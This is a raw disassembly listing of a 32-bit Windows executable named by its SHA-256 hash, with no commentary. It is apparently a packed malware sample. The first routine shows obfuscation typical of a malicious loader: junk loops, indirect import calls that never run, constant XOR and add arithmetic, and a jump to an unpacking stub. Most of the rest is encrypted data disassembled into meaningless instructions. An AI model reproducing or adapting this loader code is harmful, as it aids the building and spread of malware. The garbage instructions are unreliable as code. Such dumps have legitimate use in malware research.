
b66862f33ae2a19b2984b50f6a084b7dd28f5a6df4ee8f002647c7a19319b723.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x90
  401009:	push   esi
  40100a:	and    DWORD PTR ds:0x42a010,0x0
  401014:	jmp    0x401024
  401019:	mov    eax,ds:0x42a010
  40101e:	inc    eax
  40101f:	mov    ds:0x42a010,eax
  401024:	cmp    DWORD PTR ds:0x42a010,0x1d
  40102b:	jae    0x401072
  401031:	cmp    DWORD PTR ds:0x42a010,0xc
  401038:	jne    0x40104c
  40103e:	push   0x42900c
  401043:	push   DWORD PTR [ebp-0x18]
  401046:	call   DWORD PTR ds:0x424014
  40104c:	cmp    DWORD PTR ds:0x42a010,0xb
  401053:	jne    0x401067
  401059:	xor    eax,eax
  40105b:	xor    eax,DWORD PTR ds:0x42a010
  401061:	inc    eax
  401062:	mov    ds:0x42a010,eax
  401067:	jmp    0x401019
  40106c:	adc    ecx,0xcd5
  401072:	push   edi
  401073:	mov    DWORD PTR ds:0x42b004,0x1e
  40107d:	cmp    DWORD PTR ds:0x42b004,0x0
  401084:	je     0x4010e3
  40108a:	cmp    DWORD PTR ds:0x42b004,0x2b
  401091:	jne    0x4010bf
  401097:	push   DWORD PTR [ebp-0x10]
  40109a:	push   0x42b010
  40109f:	push   0x2447
  4010a4:	push   0x42b00c
  4010a9:	push   0x8949
  4010ae:	push   DWORD PTR [ebp-0x14]
  4010b1:	push   DWORD PTR [ebp-0x10]
  4010b4:	push   0x13a5
  4010b9:	call   DWORD PTR ds:0x424018
  4010bf:	xor    esi,esi
  4010c1:	or     esi,DWORD PTR ds:0x42b004
  4010c7:	dec    esi
  4010c8:	mov    DWORD PTR ds:0x42b004,esi
  4010ce:	jmp    0x40107d
  4010d3:	mov    eax,ds:0x42a004
  4010d8:	adc    eax,DWORD PTR ds:0x42b00c
  4010de:	mov    ds:0x42a004,eax
  4010e3:	mov    eax,ds:0x421c56
  4010e8:	mov    DWORD PTR [ebp-0x2c],eax
  4010eb:	and    DWORD PTR ds:0x428010,0x0
  4010f5:	mov    ecx,DWORD PTR ds:0x428010
  4010fb:	inc    ecx
  4010fc:	mov    DWORD PTR ds:0x428010,ecx
  401102:	cmp    DWORD PTR ds:0x428010,0x2d
  401109:	jne    0x401118
  40110f:	push   DWORD PTR [ebp-0xc]
  401112:	call   DWORD PTR ds:0x42401c
  401118:	cmp    DWORD PTR ds:0x428010,0x1f
  40111f:	jb     0x4010f5
  401125:	mov    eax,ds:0x421d62
  40112a:	and    DWORD PTR ds:0x42b008,ebx
  401130:	mov    DWORD PTR [ebp-0x3c],eax
  401133:	sbb    DWORD PTR ds:0x42b010,ebx
  401139:	and    DWORD PTR [ebp-0x34],0x0
  40113d:	or     eax,0x2114
  401142:	mov    DWORD PTR [ebp-0x20],0xf89c85b6
  401149:	xor    eax,eax
  40114b:	or     eax,DWORD PTR ds:0x429008
  401151:	xor    DWORD PTR ds:0x428008,eax
  401157:	mov    DWORD PTR [ebp-0x30],0xf89c85b5
  40115e:	mov    eax,DWORD PTR [ebp-0x1c]
  401161:	add    edi,DWORD PTR ds:0x429008
  401167:	mov    ecx,DWORD PTR [ebp-0x1c]
  40116a:	add    edi,esi
  40116c:	xor    eax,ecx
  40116e:	add    DWORD PTR ds:0x428024,edx
  401174:	mov    DWORD PTR [ebp-0x1c],eax
  401177:	and    DWORD PTR ds:0x42c000,0x0
  401181:	xor    eax,eax
  401183:	or     eax,DWORD PTR ds:0x42c000
  401189:	inc    eax
  40118a:	mov    ds:0x42c000,eax
  40118f:	cmp    DWORD PTR ds:0x42c000,0x19
  401196:	jne    0x4011a8
  40119c:	push   DWORD PTR [ebp-0x1c]
  40119f:	push   DWORD PTR [ebp-0xc]
  4011a2:	call   DWORD PTR ds:0x424020
  4011a8:	cmp    DWORD PTR ds:0x42c000,0x14
  4011af:	jb     0x401181
  4011b5:	or     DWORD PTR [ebp-0x1c],0xf89cb5b6
  4011bc:	xor    DWORD PTR ds:0x428014,0x3e14
  4011c6:	mov    eax,DWORD PTR [ebp-0x28]
  4011c9:	sbb    edi,ecx
  4011cb:	mov    ecx,DWORD PTR [ebp-0x28]
  4011ce:	and    DWORD PTR ds:0x42a008,0x0
  4011d8:	mov    esi,DWORD PTR ds:0x42a008
  4011de:	inc    esi
  4011df:	mov    DWORD PTR ds:0x42a008,esi
  4011e5:	cmp    DWORD PTR ds:0x42a008,0x7
  4011ec:	jne    0x40121a
  4011f2:	push   0x42b018
  4011f7:	push   0x2bd6
  4011fc:	push   DWORD PTR [ebp-0x14]
  4011ff:	push   0x428004
  401204:	push   DWORD PTR [ebp-0x20]
  401207:	push   0x4237e2
  40120c:	push   0x1e5d
  401211:	push   DWORD PTR [ebp-0x28]
  401214:	call   DWORD PTR ds:0x424024
  40121a:	cmp    DWORD PTR ds:0x42a008,0x6
  401221:	jne    0x401234
  401227:	mov    esi,DWORD PTR ds:0x42a008
  40122d:	inc    esi
  40122e:	mov    DWORD PTR ds:0x42a008,esi
  401234:	cmp    DWORD PTR ds:0x42a008,0x16
  40123b:	jb     0x4011d8
  401241:	sub    DWORD PTR ds:0x42c00c,0x2ac6
  40124b:	xor    eax,ecx
  40124d:	dec    ecx
  40124e:	mov    DWORD PTR [ebp-0x28],eax
  401251:	and    DWORD PTR ds:0x428018,0x0
  40125b:	jmp    0x40126d
  401260:	mov    edi,DWORD PTR ds:0x428018
  401266:	inc    edi
  401267:	mov    DWORD PTR ds:0x428018,edi
  40126d:	cmp    DWORD PTR ds:0x428018,0x1f
  401274:	jae    0x4012b7
  40127a:	cmp    DWORD PTR ds:0x428018,0x11
  401281:	jne    0x401298
  401287:	push   0x4738
  40128c:	push   DWORD PTR [ebp-0x10]
  40128f:	push   DWORD PTR [ebp-0x24]
  401292:	call   DWORD PTR ds:0x424028
  401298:	cmp    DWORD PTR ds:0x428018,0x10
  40129f:	jne    0x4012b2
  4012a5:	mov    edi,DWORD PTR ds:0x428018
  4012ab:	inc    edi
  4012ac:	mov    DWORD PTR ds:0x428018,edi
  4012b2:	jmp    0x401260
  4012b7:	add    DWORD PTR [ebp-0x28],0xf89f05b6
  4012be:	mov    eax,DWORD PTR [ebp-0x18]
  4012c1:	and    DWORD PTR ds:0x428020,0x0
  4012cb:	mov    ecx,DWORD PTR ds:0x428020
  4012d1:	inc    ecx
  4012d2:	mov    DWORD PTR ds:0x428020,ecx
  4012d8:	cmp    DWORD PTR ds:0x428020,0x15
  4012df:	jne    0x4012f5
  4012e5:	push   0x4238a9
  4012ea:	push   0x42392d
  4012ef:	call   DWORD PTR ds:0x424030
  4012f5:	cmp    DWORD PTR ds:0x428020,0x14
  4012fc:	jb     0x4012cb
  401302:	mov    ecx,DWORD PTR [ebp-0x18]
  401305:	and    DWORD PTR ds:0x42b000,0x0
  40130f:	jmp    0x401321
  401314:	mov    edi,DWORD PTR ds:0x42b000
  40131a:	inc    edi
  40131b:	mov    DWORD PTR ds:0x42b000,edi
  401321:	cmp    DWORD PTR ds:0x42b000,0x19
  401328:	jae    0x401378
  40132e:	cmp    DWORD PTR ds:0x42b000,0xa
  401335:	jne    0x401359
  40133b:	push   DWORD PTR [ebp-0x18]
  40133e:	push   0x3609
  401343:	push   DWORD PTR [ebp-0xc]
  401346:	push   DWORD PTR [ebp-0x18]
  401349:	push   0x6b70
  40134e:	push   0x42901c
  401353:	call   DWORD PTR ds:0x424038
  401359:	cmp    DWORD PTR ds:0x42b000,0x9
  401360:	jne    0x401373
  401366:	mov    edi,DWORD PTR ds:0x42b000
  40136c:	inc    edi
  40136d:	mov    DWORD PTR ds:0x42b000,edi
  401373:	jmp    0x401314
  401378:	xor    eax,ecx
  40137a:	mov    DWORD PTR [ebp-0x18],eax
  40137d:	add    DWORD PTR [ebp-0x18],0xf89c85f6
  401384:	mov    eax,DWORD PTR [ebp-0x24]
  401387:	mov    ecx,DWORD PTR [ebp-0x24]
  40138a:	xor    eax,ecx
  40138c:	mov    DWORD PTR [ebp-0x24],eax
  40138f:	add    DWORD PTR [ebp-0x24],0xf89c85d6
  401396:	mov    eax,DWORD PTR [ebp-0x14]
  401399:	mov    ecx,DWORD PTR [ebp-0x14]
  40139c:	xor    eax,ecx
  40139e:	mov    DWORD PTR [ebp-0x14],eax
  4013a1:	mov    eax,DWORD PTR [ebp-0x20]
  4013a4:	mov    ecx,DWORD PTR [ebp-0x14]
  4013a7:	mov    esi,0x7510893
  4013ac:	xor    eax,esi
  4013ae:	mov    edi,0x3272db
  4013b3:	add    eax,edi
  4013b5:	xor    eax,ecx
  4013b7:	mov    DWORD PTR [ebp-0x14],eax
  4013ba:	mov    eax,DWORD PTR [ebp-0x10]
  4013bd:	mov    ecx,DWORD PTR [ebp-0x10]
  4013c0:	sub    eax,ecx
  4013c2:	mov    DWORD PTR [ebp-0x10],eax
  4013c5:	add    DWORD PTR [ebp-0x10],0xf89c85b9
  4013cc:	mov    al,BYTE PTR [ebp-0x1]
  4013cf:	movzx  ecx,BYTE PTR [ebp-0x1]
  4013d3:	movzx  eax,al
  4013d6:	sub    ecx,eax
  4013d8:	mov    BYTE PTR [ebp-0x1],cl
  4013db:	movzx  eax,BYTE PTR [ebp-0x1]
  4013df:	xor    eax,0xffffff99
  4013e2:	mov    BYTE PTR [ebp-0x1],al
  4013e5:	mov    eax,DWORD PTR [ebp-0x20]
  4013e8:	xor    eax,esi
  4013ea:	add    eax,edi
  4013ec:	mov    DWORD PTR [ebp-0x14],eax
  4013ef:	lea    eax,[ebp-0x40]
  4013f2:	mov    DWORD PTR [ebp-0x38],eax
  4013f5:	lea    eax,[ebp-0x38]
  4013f8:	mov    DWORD PTR [ebp-0x44],eax
  4013fb:	lea    eax,[ebp-0x44]
  4013fe:	mov    DWORD PTR [ebp-0x8],eax
  401401:	lea    eax,[ebp-0x8]
  401404:	mov    DWORD PTR [ebp-0x48],eax
  401407:	mov    eax,DWORD PTR [ebp-0x18]
  40140a:	xor    eax,esi
  40140c:	add    eax,edi
  40140e:	push   eax
  40140f:	mov    eax,DWORD PTR [ebp-0x1c]
  401412:	xor    eax,esi
  401414:	add    eax,edi
  401416:	push   eax
  401417:	mov    eax,DWORD PTR [ebp-0x10]
  40141a:	xor    eax,esi
  40141c:	add    eax,edi
  40141e:	push   eax
  40141f:	lea    eax,[ebp-0x90]
  401425:	push   eax
  401426:	push   DWORD PTR [ebp-0x20]
  401429:	push   DWORD PTR [ebp-0x30]
  40142c:	jmp    0x4037ee
  401431:	mov    al,0x4c
  401433:	cmp    BYTE PTR [edx+0x44b086b4],cl
  401439:	ss ins DWORD PTR es:[edi],dx
  40143b:	dec    edi
  40143c:	clc    
  40143d:	xor    DWORD PTR [eax+0x62627b24],edx
  401443:	bound  esp,QWORD PTR [edx-0x23]
  401446:	pop    edi
  401447:	bound  esp,QWORD PTR [edx+0x9]
  40144a:	sub    DWORD PTR [edi],eax
  40144c:	pop    eax
  40144d:	add    eax,0x792e0358
  401452:	pop    ecx
  401453:	jne    0x40149a
  401455:	clc    
  401456:	in     al,dx
  401457:	jb     0x40149b
  401459:	jno    0x401482
  40145b:	into   
  40145c:	push   eax
  40145d:	hlt    
  40145e:	and    al,0xd4
  401460:	xchg   ecx,eax
  401461:	fbstp  TBYTE PTR ds:0x1153c2c8
  401467:	icebp  
  401468:	aaa    
  401469:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40146a:	add    DWORD PTR [edx-0x9],ebx
  40146d:	mov    al,ds:0xb465e64e
  401472:	in     al,dx
  401473:	(bad)  
  401474:	pop    eax
  401475:	cmp    esi,esi
  401477:	pushf  
  401478:	mov    ds:0x6b01003,eax
  40147d:	add    DWORD PTR [ebx-0x153fb6cb],0xa
  401484:	(bad)  
  401485:	scas   al,BYTE PTR es:[edi]
  401486:	sahf   
  401487:	test   eax,0x86999f74
  40148c:	js     0x4014a2
  40148e:	iret   
  40148f:	mov    edx,0xac6df4d7
  401494:	test   eax,0xdc9e713b
  401499:	xlat   BYTE PTR ds:[ebx]
  40149a:	rcr    BYTE PTR [esi+ebp*4+0x44a3fedb],0xc2
  4014a2:	aam    0x3
  4014a4:	dec    ebx
  4014a5:	std    
  4014a6:	mov    al,0x60
  4014a8:	in     eax,dx
  4014a9:	fbstp  TBYTE PTR [edx+0x7a8c4260]
  4014af:	push   ds
  4014b0:	pusha  
  4014b1:	stc    
  4014b2:	mov    al,ds:0x958913e5
  4014b7:	cmp    eax,0x95de469d
  4014bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4014bd:	loope  0x4014a5
  4014bf:	ret    0xfb84
  4014c2:	push   ecx
  4014c3:	sub    eax,0x8f09f6d7
  4014c8:	(bad)  
  4014c9:	jmp    0x36a88a81
  4014ce:	pop    eax
  4014cf:	or     cl,dh
  4014d1:	inc    edx
  4014d2:	ins    BYTE PTR es:[edi],dx
  4014d3:	stos   BYTE PTR es:[edi],al
  4014d4:	cdq    
  4014d5:	aad    0x77
  4014d7:	dec    edi
  4014d8:	pop    edi
  4014d9:	xor    DWORD PTR [ebp-0x3051591a],edx
  4014df:	test   eax,0x67fbb6c2
  4014e4:	mov    edx,0x53fb3792
  4014e9:	rcr    BYTE PTR [ecx],cl
  4014eb:	out    dx,al
  4014ec:	pop    edx
  4014ed:	idiv   dl
  4014ef:	xor    al,cl
  4014f1:	lods   al,BYTE PTR ds:[esi]
  4014f2:	inc    esi
  4014f3:	xor    DWORD PTR [ecx+edi*4+0x13356d7f],ecx
  4014fa:	cmc    
  4014fb:	jne    0x4014ab
  4014fd:	push   cs
  4014fe:	push   0x3f96bf88
  401503:	xchg   edx,eax
  401504:	push   DWORD PTR [edi-0x5eba257f]
  40150a:	push   edi
  40150b:	or     eax,0x9d726a32
  401510:	fs pop ds
  401512:	fisttp DWORD PTR [ebx+ecx*2]
  401515:	scas   al,BYTE PTR es:[edi]
  401516:	pusha  
  401517:	push   ss
  401518:	jge    0x401541
  40151a:	mov    dl,0x8a
  40151c:	pop    es
  40151d:	lahf   
  40151e:	dec    eax
  40151f:	xchg   esi,eax
  401520:	mov    al,ds:0x470334a8
  401525:	enter  0x67f4,0x92
  401529:	loop   0x4014c9
  40152b:	frstor [ebp+esi*1+0x38]
  40152f:	fnstenv [ebx-0x5f13e857]
  401535:	call   FWORD PTR [ebp-0x45]
  401538:	icebp  
  401539:	mov    WORD PTR [esp+edx*2+0x55],fs
  40153d:	xor    eax,0x93c1fac2
  401542:	or     ebx,DWORD PTR [eax-0x3d969536]
  401548:	retf   0x4550
  40154b:	add    bh,dh
  40154d:	outs   dx,DWORD PTR ds:[esi]
  40154e:	mov    bh,0xc
  401550:	cli    
  401551:	jb     0x401561
  401553:	sbb    ch,BYTE PTR [esi+0x1c]
  401556:	jae    0x4014ee
  401558:	cmp    ah,BYTE PTR [ebx+0x24]
  40155b:	pop    ebx
  40155c:	out    0xdc,al
  40155e:	cmp    ecx,0xffffffc5
  401561:	xchg   esi,eax
  401562:	xor    BYTE PTR [ebp+0x1c],dh
  401565:	xchg   edx,eax
  401566:	and    DWORD PTR es:[eax+edi*1],edi
  40156a:	adc    al,0x38
  40156c:	xor    BYTE PTR [edx+0x3a1fe73],0x73
  401573:	xor    BYTE PTR [ebp+0x36],ah
  401576:	and    DWORD PTR [esi],eax
  401578:	data16 jbe 0x401542
  40157b:	push   cs
  40157c:	sub    al,dh
  40157e:	(bad)  
  40157f:	ret    
  401580:	aad    0x9c
  401582:	and    eax,0xf7ef235c
  401587:	cs repz (bad) 
  40158a:	inc    ecx
  40158b:	xchg   ebx,eax
  40158c:	xchg   ecx,eax
  40158d:	xchg   esi,ebp
  40158f:	ins    BYTE PTR es:[edi],dx
  401590:	mov    al,0x46
  401592:	cmp    eax,0x717a067
  401597:	bound  edx,QWORD PTR [edi-0x4f93c514]
  40159d:	dec    ecx
  40159e:	sbb    dl,BYTE PTR [ebp+0x96452bf]
  4015a4:	or     al,0xaf
  4015a6:	int3   
  4015a7:	out    0xb2,eax
  4015a9:	xchg   esp,eax
  4015aa:	fcom   DWORD PTR [esi]
  4015ac:	dec    DWORD PTR [eax+0x288beb57]
  4015b2:	xor    eax,0x61df16be
  4015b7:	sbb    DWORD PTR [edx],ecx
  4015b9:	cmp    DWORD PTR [ebx+0x3afe27d5],esp
  4015bf:	add    DWORD PTR [edx],edi
  4015c1:	add    al,0x39
  4015c3:	xor    eax,0x5e7590ec
  4015c8:	(bad)  
  4015c9:	fstp   st(5)
  4015cb:	dec    ebx
  4015cc:	inc    ebp
  4015cd:	dec    ecx
  4015ce:	push   ebp
  4015cf:	in     eax,dx
  4015d0:	cs test al,0x2e
  4015d3:	push   es
  4015d4:	push   ss
  4015d5:	dec    edx
  4015d6:	cmp    BYTE PTR [esi+0x5a],ah
  4015d9:	sahf   
  4015da:	jp     0x4015f9
  4015dc:	push   0x5d69cde3
  4015e1:	xchg   ebx,eax
  4015e2:	push   eax
  4015e3:	mov    eax,0x9ab5e50f
  4015e8:	pop    esp
  4015e9:	sub    eax,0xfb353a5e
  4015ee:	lods   al,BYTE PTR ds:[esi]
  4015ef:	mov    dl,0x2d
  4015f1:	xor    BYTE PTR [ecx-0x7146a251],cl
  4015f7:	push   ebp
  4015f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4015f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4015fa:	popa   
  4015fb:	pop    ss
  4015fc:	push   esp
  4015fd:	test   eax,0x182f1ba2
  401602:	sub    eax,0x8c652d7f
  401607:	ds scas al,BYTE PTR es:[edi]
  401609:	pusha  
  40160a:	cmp    eax,esp
  40160c:	jl     0x4015c4
  40160e:	mov    ebp,0x93093232
  401613:	test   DWORD PTR [esp+ebp*8+0x13],ebx
  401617:	mov    esp,0x551ee0a2
  40161c:	dec    ebx
  40161d:	xor    eax,0x1dc927cd
  401622:	sti    
  401623:	test   eax,0x3aff18b2
  401628:	call   FWORD PTR [edx-0x6f6e3ea7]
  40162e:	retf   
  40162f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401630:	shl    BYTE PTR [esi+0x11],1
  401633:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401634:	mov    gs,eax
  401636:	leave  
  401637:	mov    ch,0xd5
  401639:	dec    esp
  40163a:	mov    al,ds:0xbcb08a63
  40163f:	(bad)
  401643:	pop    es
  401644:	sub    DWORD PTR [ebp+0x403e59a4],ebp
  40164a:	sbb    bh,dh
  40164c:	jge    0x4015db
  40164e:	add    al,0xcc
  401650:	dec    BYTE PTR [edx+edi*4-0x9]
  401654:	test   al,al
  401656:	pop    esp
  401657:	mov    bl,0xb1
  401659:	data16 mov ch,0xc8
  40165c:	or     dl,BYTE PTR [ebx+0x78]
  40165f:	add    DWORD PTR [edi-0x5cb2d243],0x87095143
  401669:	and    eax,0x6702ce30
  40166e:	test   DWORD PTR [edi],eax
  401670:	cdq    
  401671:	jl     0x4016c2
  401673:	and    eax,0x9269df7b
  401678:	xor    DWORD PTR ss:[ecx],ecx
  40167b:	sbb    esp,ecx
  40167d:	loope  0x4016a5
  40167f:	(bad)  
  401680:	mov    edi,0x144705f9
  401685:	loop   0x40168d
  401687:	hlt    
  401688:	loop   0x401673
  40168a:	push   ss
  40168b:	push   esi
  40168c:	adc    al,0xf7
  40168e:	fs cmp eax,0x1d9fad39
  401694:	and    DWORD PTR [esi-0x6a6f1736],esp
  40169a:	mov    ebp,0xe955b61
  40169f:	jnp    0x401708
  4016a1:	fild   DWORD PTR [ebx+edi*8]
  4016a4:	hlt    
  4016a5:	add    bh,dl
  4016a7:	vpminsw xmm0,xmm1,XMMWORD PTR [ebp+ecx*8+0x7e]
  4016ad:	inc    esi
  4016ae:	sbb    eax,0x6f2118de
  4016b3:	jge    0x4016b4
  4016b5:	pop    ds
  4016b6:	mov    esi,0x4fec8c11
  4016bb:	and    BYTE PTR [eax-0x2e970060],cl
  4016c1:	aad    0x27
  4016c3:	xchg   esi,eax
  4016c4:	jle    0x40171f
  4016c6:	outs   dx,BYTE PTR ds:[esi]
  4016c7:	adc    eax,DWORD PTR [edx]
  4016c9:	outs   dx,BYTE PTR ds:[esi]
  4016ca:	(bad)  
  4016cb:	mov    esi,0x5c1c55f1
  4016d0:	inc    DWORD PTR [ebx+eiz*1+0x47]
  4016d4:	mov    eax,ds:0x152cde08
  4016d9:	adc    eax,0x41df3bb1
  4016de:	mov    ds:0x8aada7f8,al
  4016e3:	jb     0x40172d
  4016e5:	bswap  esp
  4016e7:	mov    esp,0x9f84712f
  4016ec:	mov    eax,ds:0xebdda90a
  4016f1:	cdq    
  4016f2:	adc    eax,0xb186703e
  4016f7:	or     ecx,DWORD PTR [esi+0x1b]
  4016fa:	mov    ah,0x67
  4016fc:	jmp    DWORD PTR ds:0xc30ef819
  401702:	mov    WORD PTR [edi+0xe],cs
  401705:	into   
  401706:	js     0x4016da
  401708:	gs mov edi,0xb914a060
  40170e:	add    BYTE PTR [ecx+ebx*4+0x45d423db],ch
  401715:	outs   dx,BYTE PTR ds:[esi]
  401716:	add    esi,DWORD PTR [ebx]
  401718:	push   ebp
  401719:	out    dx,eax
  40171a:	add    eax,0x311e4875
  40171f:	mov    ch,bh
  401721:	pop    edx
  401722:	imul   eax,DWORD PTR [eax],0xf7192e1f
  401728:	adc    BYTE PTR [ebx-0x73a60b7a],dh
  40172e:	push   edx
  40172f:	ins    BYTE PTR es:[edi],dx
  401730:	ffreep st(1)
  401732:	enter  0xd384,0xde
  401736:	dec    ecx
  401737:	or     DWORD PTR [eax-0x1cbc0925],ecx
  40173d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40173e:	add    al,0x8a
  401740:	in     eax,0xcb
  401742:	cmp    DWORD PTR [esi],edx
  401744:	fs icebp 
  401746:	or     al,0x83
  401748:	arpl   WORD PTR [ebp+0x77e1f6bd],di
  40174e:	jnp    0x40173a
  401750:	sbb    ebp,DWORD PTR [esi+0x17]
  401753:	cwde   
  401754:	in     al,0x5
  401756:	retf   0xb273
  401759:	or     cl,bh
  40175b:	sbb    al,0x69
  40175d:	mov    ebx,0x2f38d7b2
  401762:	cmp    al,0x44
  401764:	push   esi
  401765:	mov    WORD PTR [ecx+0x58],fs
  401768:	arpl   WORD PTR [ecx],di
  40176a:	xchg   ecx,eax
  40176c:	imul   edi,DWORD PTR [edi+0x15],0x5d
  401770:	xchg   esi,eax
  401771:	push   eax
  401772:	sub    BYTE PTR [edx+0x74],0xa7
  401776:	outs   dx,BYTE PTR ds:[esi]
  401777:	xchg   edi,eax
  401778:	inc    ebp
  401779:	jbe    0x4017f3
  40177b:	ins    DWORD PTR es:[edi],dx
  40177c:	push   eax
  40177d:	ret    
  40177e:	jle    0x401720
  401780:	int3   
  401781:	aad    0xa
  401783:	mov    ah,0xc9
  401785:	outs   dx,DWORD PTR ds:[esi]
  401786:	cmp    BYTE PTR [esi+0x4336eb5b],dh
  40178c:	hlt    
  40178d:	bound  ecx,QWORD PTR [ecx+0x13]
  401790:	xchg   edx,eax
  401791:	inc    ecx
  401792:	push   0x1e029808
  401797:	loope  0x4017bb
  401799:	inc    esi
  40179a:	and    BYTE PTR [eax-0x7],bh
  40179d:	xchg   edi,eax
  40179e:	dec    esi
  40179f:	outs   dx,DWORD PTR ds:[esi]
  4017a0:	push   esp
  4017a1:	cmovns esi,ebx
  4017a4:	in     al,0xc9
  4017a6:	inc    ecx
  4017a7:	pop    ecx
  4017a8:	(bad)  
  4017a9:	call   0xd701:0x7c1f1227
  4017b0:	data16 jge 0x401804
  4017b3:	in     al,0x8a
  4017b5:	shl    BYTE PTR [esi],0x6d
  4017b8:	sbb    esi,edx
  4017ba:	or     eax,DWORD PTR [eax+ecx*1-0x2069a4b]
  4017c1:	call   0xce5f:0x83aad132
  4017c8:	fld    DWORD PTR [edi-0x65424720]
  4017ce:	call   0xc65e:0xb651b453
  4017d5:	popf   
  4017d6:	fldenv [ecx+0x3036e615]
  4017dc:	std    
  4017dd:	outs   dx,DWORD PTR ds:[esi]
  4017de:	out    0xf2,eax
  4017e0:	ja     0x4017a7
  4017e2:	stc    
  4017e3:	lods   eax,DWORD PTR ds:[esi]
  4017e4:	sub    eax,DWORD PTR [ebx+0x7e]
  4017e7:	ss jle 0x40184b
  4017ea:	add    al,BYTE PTR [edx]
  4017ec:	inc    ebp
  4017ed:	jp     0x40185e
  4017ef:	sar    BYTE PTR [edx-0x5bffdbe6],0x16
  4017f6:	push   ds
  4017f7:	jge    0x4017d7
  4017f9:	shl    bh,1
  4017fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4017fc:	and    edx,eax
  4017fe:	pop    ebp
  4017ff:	mov    ebp,0x4897d24c
  401804:	dec    ecx
  401805:	pop    edi
  401806:	add    DWORD PTR [edx+0x454f1780],edi
  40180c:	cmp    al,0xc4
  40180e:	pop    ebx
  40180f:	xor    BYTE PTR [ecx+0xa534004],ch
  401815:	xchg   esi,edi
  401817:	push   es
  401818:	or     DWORD PTR [ebx+0x35],edx
  40181b:	mov    ch,0x66
  40181d:	in     al,dx
  40181e:	or     DWORD PTR [ecx+0x8aa3988],esi
  401824:	push   ss
  401825:	fnstenv [eax+0x55]
  401828:	enter  0xa4f6,0x40
  40182c:	(bad)  
  40182d:	push   eax
  40182e:	outs   dx,BYTE PTR ds:[esi]
  40182f:	dec    eax
  401830:	add    al,0xe
  401832:	arpl   bp,si
  401834:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401835:	push   eax
  401836:	or     eax,DWORD PTR [ecx+0x57]
  401839:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40183a:	or     bh,dh
  40183c:	(bad)  
  40183d:	cwde   
  40183e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40183f:	inc    ebx
  401840:	adc    BYTE PTR [edx],ah
  401842:	pop    ebx
  401843:	jae    0x40186d
  401845:	mov    WORD PTR [ecx-0xc],ss
  401848:	cmp    BYTE PTR [ecx-0x78],ah
  40184b:	jne    0x401821
  40184d:	jne    0x40184f
  40184f:	add    DWORD PTR [ecx],ebp
  401851:	and    ch,bl
  401853:	mov    dl,0x47
  401855:	mov    dl,0x71
  401857:	mov    WORD PTR [ebx],es
  401859:	add    BYTE PTR [edx],0xb7
  40185c:	mov    bl,0x76
  40185e:	out    0x98,al
  401860:	push   es
  401861:	jnp    0x4017f4
  401863:	rcr    BYTE PTR [ebp-0x49],cl
  401866:	xor    al,0xd3
  401868:	bound  ebp,QWORD PTR [esi]
  40186a:	xchg   ecx,eax
  40186b:	cmp    ecx,ebp
  40186d:	xchg   ecx,eax
  40186e:	retf   
  40186f:	daa    
  401870:	retf   
  401871:	dec    edi
  401872:	mov    edi,0xc85958f1
  401877:	lea    ebx,[esp+ecx*8]
  40187a:	ins    BYTE PTR es:[edi],dx
  40187b:	jns    0x401829
  40187d:	shr    BYTE PTR [edi],0x4b
  401880:	push   esp
  401881:	fcom   QWORD PTR [edi]
  401883:	adc    eax,DWORD PTR [esi]
  401885:	(bad)  
  401886:	sub    eax,0x5680caaa
  40188b:	sub    ebp,DWORD PTR [eax-0x36]
  40188e:	(bad)  
  40188f:	leave  
  401890:	js     0x40186e
  401892:	dec    ebp
  401893:	data16 adc ch,BYTE PTR [ebx+0x68a2ccee]
  40189a:	lods   eax,DWORD PTR ds:[esi]
  40189b:	sbb    ebp,ebp
  40189d:	in     al,dx
  40189e:	and    al,0xc8
  4018a0:	loop   0x4018ef
  4018a2:	push   edx
  4018a3:	xchg   ebp,eax
  4018a4:	imul   edi,DWORD PTR [eax],0xf5ce0d11
  4018aa:	js     0x40183c
  4018ac:	in     eax,0x1b
  4018ae:	push   cs
  4018af:	clc    
  4018b0:	arpl   WORD PTR [esi],di
  4018b2:	fs nop
  4018b4:	or     DWORD PTR [ebx-0x184a492e],eax
  4018ba:	test   DWORD PTR [edx-0x2e],esp
  4018bd:	cmc    
  4018be:	outs   dx,DWORD PTR ds:[esi]
  4018bf:	xor    eax,0x10639784
  4018c4:	mov    dh,0x1d
  4018c6:	neg    BYTE PTR [edi-0x4f]
  4018c9:	outs   dx,BYTE PTR ds:[esi]
  4018ca:	iret   
  4018cb:	(bad)  
  4018cc:	mov    eax,0xeb84ad2d
  4018d1:	das    
  4018d2:	pushf  
  4018d3:	test   BYTE PTR [edx],ch
  4018d5:	dec    esi
  4018d6:	mov    eax,0x49d25eec
  4018db:	int    0xa3
  4018dd:	push   ss
  4018de:	cmp    ecx,edx
  4018e0:	push   cs
  4018e1:	xor    al,0x1b
  4018e3:	mov    eax,0x8bca5903
  4018e8:	xchg   esi,eax
  4018e9:	jge    0x4018a5
  4018eb:	fdivr  DWORD PTR [edi-0x32]
  4018ee:	jo     0x4018b9
  4018f0:	inc    eax
  4018f1:	pop    esi
  4018f2:	in     eax,0x80
  4018f4:	addr16 lahf 
  4018f6:	in     eax,0xe5
  4018f8:	vpcmpgtw ymm6,ymm7,YMMWORD PTR [esi+0x6bc41f31]
  401900:	stc    
  401901:	retf   0x731b
  401904:	jnp    0x40196b
  401906:	adc    edi,ebx
  401908:	xor    ebp,DWORD PTR [edi+0x6f]
  40190b:	sbb    edi,esp
  40190d:	imul   ecx,DWORD PTR [esp+edi*2],0x4e
  401911:	std    
  401912:	pop    ebx
  401913:	(bad)  
  401914:	retf   
  401915:	lods   al,BYTE PTR es:[esi]
  401917:	pop    ds
  401918:	ds jae 0x4018ba
  40191b:	xchg   ebp,eax
  40191c:	mov    fs,WORD PTR [edi+0x34633fb5]
  401922:	imul   ebp,DWORD PTR [ecx+0x5a],0x2e
  401926:	div    DWORD PTR [ebx+0x40]
